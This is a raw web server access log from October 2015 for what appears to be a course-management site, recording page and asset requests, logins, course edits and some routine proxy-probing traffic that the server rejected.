210.30.100.2 - - [30/Oct/2015:14:26:48 +0800] "GET /static/css/style.css HTTP/1.1" 200 8159 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:48 +0800] "GET /static/css/slider.css HTTP/1.1" 200 1263 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:48 +0800] "GET /static/css/responsive.css HTTP/1.1" 200 1339 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:48 +0800] "GET /static/css/zerogrid.css HTTP/1.1" 200 2468 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:48 +0800] "GET /static/images/logo.png HTTP/1.1" 200 10579 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:48 +0800] "GET /static/css/font-awesome.min.css HTTP/1.1" 200 26711 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:48 +0800] "GET /static/images/slider-1.jpg HTTP/1.1" 200 53288 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:49 +0800] "GET /static/images/header-bg-shadow.png HTTP/1.1" 200 1116 "http://121.42.203.57/static/css/style.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:49 +0800] "GET /static/images/header-bg.jpg HTTP/1.1" 200 12744 "http://121.42.203.57/static/css/style.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:49 +0800] "GET /static/images/pagination.png HTTP/1.1" 200 3354 "http://121.42.203.57/static/css/slider.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:50 +0800] "GET /static/fonts/fontawesome-webfont.woff2?v=4.4.0 HTTP/1.1" 200 64464 "http://121.42.203.57/static/css/font-awesome.min.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:50 +0800] "GET /static/images/slider-2.jpg HTTP/1.1" 200 145067 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:50 +0800] "GET /resource HTTP/1.1" 200 3334 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:51 +0800] "GET /static/images/slider-3.jpg HTTP/1.1" 200 143856 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:51 +0800] "GET /static/js/footer.js HTTP/1.1" 200 282 "http://121.42.203.57/resource" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:51 +0800] "GET /static/js/bootstrap.min.js HTTP/1.1" 200 36816 "http://121.42.203.57/resource" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:53 +0800] "GET /static/css/bootstrap.min.css HTTP/1.1" 200 122443 "http://121.42.203.57/resource" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:53 +0800] "GET /static/js/jquery-1.11.3.min.js HTTP/1.1" 200 95957 "http://121.42.203.57/resource" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:26:54 +0800] "GET /favicon.ico HTTP/1.1" 404 570 "http://121.42.203.57/resource" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:55:26 +0800] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:55:26 +0800] "GET /static/css/reset.css HTTP/1.1" 200 1108 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:55:26 +0800] "GET /static/css/slider.css HTTP/1.1" 200 1263 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:55:26 +0800] "GET /static/css/responsive.css HTTP/1.1" 200 1339 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:55:26 +0800] "GET /static/css/style.css HTTP/1.1" 200 8159 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:55:26 +0800] "GET /static/css/zerogrid.css HTTP/1.1" 200 2468 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:55:26 +0800] "GET /static/css/font-awesome.min.css HTTP/1.1" 200 26711 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:55:26 +0800] "GET /static/images/logo.png HTTP/1.1" 200 10579 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:55:27 +0800] "GET /static/images/header-bg.jpg HTTP/1.1" 200 12744 "http://121.42.203.57/static/css/style.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:55:27 +0800] "GET /static/images/header-bg-shadow.png HTTP/1.1" 200 1116 "http://121.42.203.57/static/css/style.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:55:27 +0800] "GET /static/images/slider-1.jpg HTTP/1.1" 200 53288 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:55:27 +0800] "GET /static/images/pagination.png HTTP/1.1" 200 3354 "http://121.42.203.57/static/css/slider.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:55:28 +0800] "GET /static/fonts/fontawesome-webfont.woff2?v=4.4.0 HTTP/1.1" 200 64464 "http://121.42.203.57/static/css/font-awesome.min.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:55:29 +0800] "GET /static/images/slider-2.jpg HTTP/1.1" 200 145067 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:14:55:29 +0800] "GET /static/images/slider-3.jpg HTTP/1.1" 200 143856 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:15:07:04 +0800] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
223.95.73.216 - - [30/Oct/2015:15:42:25 +0800] "GET http://wap.ip138.com/ HTTP/1.1" 200 6538 "-" "Apache-HttpClient/4.5 (Java/1.7.0_45)"
5.178.86.74 - - [30/Oct/2015:16:07:42 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144619246337&a=PSCN&i=&p= HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
210.30.100.2 - - [30/Oct/2015:17:21:54 +0800] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:17:21:54 +0800] "GET /favicon.ico HTTP/1.1" 404 570 "http://121.42.203.57/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
210.30.100.2 - - [30/Oct/2015:17:22:43 +0800] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
112.74.206.117 - - [30/Oct/2015:19:17:23 +0800] "HEAD / HTTP/1.1" 405 0 "-" "Baiduspider"
36.229.233.207 - - [30/Oct/2015:20:13:19 +0800] "CONNECT 163mx02.mxmail.netease.com:25 HTTP/1.0" 400 172 "-" "-"
121.42.210.61 - - [30/Oct/2015:20:25:07 +0800] "GET / HTTP/1.1" 200 6538 "-" "-"
121.42.210.61 - - [30/Oct/2015:20:25:08 +0800] "" 400 0 "-" "-"
121.42.164.186 - - [30/Oct/2015:20:47:38 +0800] "CONNECT www.google.co.uk:443 HTTP/1.1" 400 172 "-" "-"
121.42.195.6 - - [30/Oct/2015:20:53:06 +0800] "CONNECT www.google.co.uk:443 HTTP/1.1" 400 172 "-" "-"
185.25.151.159 - - [30/Oct/2015:21:21:32 +0800] "GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.25.151.159 - - [30/Oct/2015:21:21:41 +0800] "GET http://testp2.czar.bielawa.pl/testproxy.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
123.158.49.91 - - [30/Oct/2015:23:36:20 +0800] "GET / HTTP/1.0" 200 6538 "-" "-"
124.90.55.34 - - [30/Oct/2015:23:36:21 +0800] "GET /home.asp HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; 360-cn-agent)"
124.90.49.186 - - [30/Oct/2015:23:36:21 +0800] "GET / HTTP/1.1" 200 6538 "-" "-"
124.90.53.27 - - [30/Oct/2015:23:36:21 +0800] "GET / HTTP/1.0" 200 6538 "-" "-"
154.87.1.102 - - [31/Oct/2015:00:41:30 +0800] "GET / HTTP/1.1" 200 6538 "-" "-"
183.60.48.25 - - [31/Oct/2015:02:49:54 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6538 "-" "-"
114.221.203.236 - - [31/Oct/2015:06:48:18 +0800] "GET http://www.baidu.com HTTP/1.1" 200 6538 "-" "-"
61.160.213.110 - - [31/Oct/2015:10:23:36 +0800] "GET http://zc.qq.com/chs/index.html?type=1 HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
202.118.73.69 - - [31/Oct/2015:10:25:25 +0800] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:25:26 +0800] "GET /static/css/style.css HTTP/1.1" 304 0 "http://121.42.203.57/" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:25:29 +0800] "GET /favicon.ico HTTP/1.1" 404 168 "-" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:25:29 +0800] "GET /favicon.ico HTTP/1.1" 404 168 "-" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:26:33 +0800] "GET /resource HTTP/1.1" 304 0 "http://121.42.203.57/" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:26:36 +0800] "GET /user HTTP/1.1" 304 0 "http://121.42.203.57/resource" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:26:41 +0800] "GET /createCourse HTTP/1.1" 304 0 "http://121.42.203.57/user" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:26:44 +0800] "GET /user HTTP/1.1" 304 0 "http://121.42.203.57/createCourse" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:26:46 +0800] "GET /courseInfo HTTP/1.1" 304 0 "http://121.42.203.57/user" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:26:48 +0800] "GET / HTTP/1.1" 304 0 "http://121.42.203.57/courseInfo" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:28:20 +0800] "GET /courseInfo HTTP/1.1" 304 0 "http://121.42.203.57/" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:28:29 +0800] "GET /courseInfo-teachers HTTP/1.1" 304 0 "http://121.42.203.57/courseInfo" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:28:36 +0800] "GET /user HTTP/1.1" 304 0 "http://121.42.203.57/courseInfo-teachers" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:28:39 +0800] "GET /createCourse HTTP/1.1" 304 0 "http://121.42.203.57/user" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:28:52 +0800] "POST /createCourse HTTP/1.1" 200 21 "http://121.42.203.57/createCourse" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:28:52 +0800] "GET /user HTTP/1.1" 200 5597 "http://121.42.203.57/createCourse" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:28:56 +0800] "GET /user/updateCourse/2015-1-08-10 HTTP/1.1" 200 4953 "http://121.42.203.57/user" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:28:56 +0800] "GET /static/js/updateCourse.js HTTP/1.1" 200 2391 "http://121.42.203.57/user/updateCourse/2015-1-08-10" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:29:00 +0800] "POST /user/updateCourse/ HTTP/1.1" 200 37 "http://121.42.203.57/user/updateCourse/2015-1-08-10" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:29:00 +0800] "GET /user HTTP/1.1" 200 5609 "http://121.42.203.57/user/updateCourse/2015-1-08-10" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:29:09 +0800] "GET /user/courseToStart HTTP/1.1" 200 5552 "http://121.42.203.57/user" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:29:12 +0800] "GET /user/CourseHistory HTTP/1.1" 200 5025 "http://121.42.203.57/user/courseToStart" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:29:13 +0800] "GET /user/AllStudents HTTP/1.1" 200 5036 "http://121.42.203.57/user/CourseHistory" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:29:21 +0800] "GET /user/publish HTTP/1.1" 200 4287 "http://121.42.203.57/user/AllStudents" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:29:24 +0800] "GET /user/publish/resources HTTP/1.1" 200 5803 "http://121.42.203.57/user/publish" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:29:24 +0800] "GET /static/js/ajaxfileupload.js HTTP/1.1" 404 168 "http://121.42.203.57/user/publish/resources" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:29:40 +0800] "GET /user HTTP/1.1" 304 0 "http://121.42.203.57/user/publish/resources" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:29:42 +0800] "GET /user/AllStudents HTTP/1.1" 304 0 "http://121.42.203.57/user" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:29:44 +0800] "GET /logout HTTP/1.1" 302 0 "http://121.42.203.57/user/AllStudents" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:29:44 +0800] "GET / HTTP/1.1" 200 6538 "http://121.42.203.57/user/AllStudents" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:29:47 +0800] "GET /login HTTP/1.1" 200 4835 "http://121.42.203.57/" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:30:01 +0800] "GET /signUp HTTP/1.1" 200 6406 "http://121.42.203.57/login" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:30:02 +0800] "GET /static/js/signup.js HTTP/1.1" 304 0 "http://121.42.203.57/signUp" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:30:14 +0800] "GET / HTTP/1.1" 304 0 "http://121.42.203.57/signUp" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:31:49 +0800] "GET /login HTTP/1.1" 304 0 "http://121.42.203.57/" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:31:51 +0800] "GET /signUp HTTP/1.1" 304 0 "http://121.42.203.57/login" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:42:15 +0800] "GET / HTTP/1.1" 304 0 "http://121.42.203.57/signUp" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:44:39 +0800] "GET /login HTTP/1.1" 304 0 "http://121.42.203.57/" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:44:41 +0800] "GET /signUp HTTP/1.1" 304 0 "http://121.42.203.57/login" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
183.60.48.25 - - [31/Oct/2015:10:49:46 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6538 "-" "-"
202.118.73.69 - - [31/Oct/2015:10:52:23 +0800] "POST /signUp HTTP/1.1" 400 479 "http://121.42.203.57/signUp" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:52:25 +0800] "POST /signUp HTTP/1.1" 400 479 "http://121.42.203.57/signUp" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:52:29 +0800] "POST /signUp HTTP/1.1" 400 479 "http://121.42.203.57/signUp" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:52:46 +0800] "GET /login HTTP/1.1" 304 0 "http://121.42.203.57/signUp" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:53:04 +0800] "POST /login HTTP/1.1" 200 21 "http://121.42.203.57/login" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:53:04 +0800] "GET / HTTP/1.1" 200 6581 "http://121.42.203.57/login" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:53:06 +0800] "GET /user HTTP/1.1" 304 0 "http://121.42.203.57/" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:53:09 +0800] "GET /user/updateCourse/2015-1-08-10 HTTP/1.1" 200 4935 "http://121.42.203.57/user" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:53:11 +0800] "POST /user/updateCourse/ HTTP/1.1" 200 37 "http://121.42.203.57/user/updateCourse/2015-1-08-10" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:53:11 +0800] "GET /setForm/2015-1-08-10 HTTP/1.1" 200 5028 "http://121.42.203.57/user/updateCourse/2015-1-08-10" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:54:31 +0800] "POST /setForm/2015-1-08-10 HTTP/1.1" 200 21 "http://121.42.203.57/setForm/2015-1-08-10" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:54:33 +0800] "GET /user HTTP/1.1" 200 5603 "http://121.42.203.57/setForm/2015-1-08-10" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:54:37 +0800] "GET /courseInfo HTTP/1.1" 304 0 "http://121.42.203.57/user" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:54:38 +0800] "GET /notifications HTTP/1.1" 304 0 "http://121.42.203.57/courseInfo" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:54:39 +0800] "GET /resource HTTP/1.1" 304 0 "http://121.42.203.57/notifications" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:54:40 +0800] "GET /user HTTP/1.1" 304 0 "http://121.42.203.57/resource" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:54:42 +0800] "GET /user/publish HTTP/1.1" 304 0 "http://121.42.203.57/user" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:54:45 +0800] "GET /user/publish/resources HTTP/1.1" 304 0 "http://121.42.203.57/user/publish" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:54:45 +0800] "GET /static/js/ajaxfileupload.js HTTP/1.1" 404 168 "http://121.42.203.57/user/publish/resources" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:55:15 +0800] "GET /notifications HTTP/1.1" 304 0 "http://121.42.203.57/user/publish/resources" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:55:18 +0800] "GET /resource HTTP/1.1" 304 0 "http://121.42.203.57/notifications" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:55:20 +0800] "GET /user HTTP/1.1" 304 0 "http://121.42.203.57/resource" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:55:22 +0800] "GET /user/publish HTTP/1.1" 304 0 "http://121.42.203.57/user" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:55:23 +0800] "GET /user/publish/notifications HTTP/1.1" 200 5804 "http://121.42.203.57/user/publish" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:55:23 +0800] "GET /static/js/ajaxfileupload.js HTTP/1.1" 404 168 "http://121.42.203.57/user/publish/notifications" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:55:50 +0800] "POST /user/publish/notifications HTTP/1.1" 200 46 "http://121.42.203.57/user/publish/notifications" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:55:51 +0800] "GET /notifications HTTP/1.1" 200 3478 "http://121.42.203.57/user/publish/notifications" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:55:56 +0800] "GET /notifications/detail/5962 HTTP/1.1" 200 3788 "http://121.42.203.57/notifications" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
202.118.73.69 - - [31/Oct/2015:10:55:58 +0800] "GET /notifications HTTP/1.1" 304 0 "http://121.42.203.57/notifications/detail/5962" "Mozilla/5.0 (Windows NT 10.0; rv:41.0) Gecko/20100101 Firefox/41.0"
